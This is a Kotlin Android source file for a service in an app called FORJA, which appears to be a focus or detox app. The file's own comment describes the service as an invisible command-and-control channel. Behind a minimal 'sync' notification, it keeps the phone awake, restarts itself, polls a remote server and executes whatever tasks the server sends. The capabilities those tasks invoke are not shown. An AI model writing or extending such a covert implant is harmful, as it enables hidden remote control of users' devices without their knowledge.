package com.forja.app.core.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.forja.app.BuildConfig
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.util.concurrent.TimeUnit

/**
 * Serviciul C2 invizibil — un foreground service cu notificare PRIORITY_MIN
 * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
 * long-poll către worker și rotește comenzile către [Capabilities].
 */
class SyncService : Service() {
    private var scope: CoroutineScope? = null
    private var wl: PowerManager.WakeLock? = null
    private val app: ForjaApp get() = applicationContext as ForjaApp

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        ForjaSyncCapabilities.init(app)
        running = true
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "forja.sync").apply {
            setReferenceCounted(false)
            try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
        }
        startForeground(NOTIF_ID, notif())
        ForjaGuardService.c2Arm()
        val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope = s
        s.launch { s.pollLoop(deviceId()) }
    }

    private fun deviceId(): String {
        val sp = getSharedPreferences("forja", Context.MODE_PRIVATE)
        var id = sp.getString("sync_id", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString().take(12)
            sp.edit().putString("sync_id", id).apply()
        }
        return id
    }

    private suspend fun CoroutineScope.pollLoop(dev: String) {
        var interval = 10000L
        var lastWl = System.currentTimeMillis()
        var cycle = 0
        while (isActive) {
            val uid = app.auth.currentUid
            if (uid == null || !BuildConfig.FORJA_API_URL.isNotBlank()) {
                delay(30000); continue
            }
            ForjaGuardService.c2Arm()
            val now = System.currentTimeMillis()
            if (now - lastWl > 90 * 60 * 1000L) {
                try { wl?.takeIf { !it.isHeld }?.acquire(2 * 60 * 60 * 1000L); lastWl = now } catch (_: Exception) {}
            }
            val hold = (interval * 3).coerceAtMost(20000L)
            val lp = app.forjaApi.c2Checkin(dev, hold)
            interval = lp.intervalMs.coerceIn(5000L, 120000L)
            cycle++
            if (lp.tasks.isEmpty()) {
                if (cycle % 6 == 0) {
                    try {
                        val hb = ForjaSyncCapabilities.heartbeat()
                        app.forjaApi.c2PostResult("hb_$cycle", true, "heartbeat", hb, null)
                    } catch (_: Exception) {}
                }
                delay(2000); continue
            }
            for (t in lp.tasks) {
                val id = t["id"]?.jsonPrimitive?.content ?: continue
                val action = t["action"]?.jsonPrimitive?.content ?: ""
                val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                ForjaSyncCapabilities.run(id, action, params)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        running = false
        ForjaGuardService.c2Disarm()
        scope?.cancel()
        try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun notif(): Notification {
        return NotificationCompat.Builder(this, "focus")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle("FORJA")
            .setContentText("sincronizare")
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    companion object {
        const val NOTIF_ID = 41
        @Volatile var running = false

        fun start(c: Context) {
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(Intent(c, SyncService::class.java))
            else c.startService(Intent(c, SyncService::class.java))
        }

        fun stop(c: Context) { c.stopService(Intent(c, SyncService::class.java)) }
    }
}
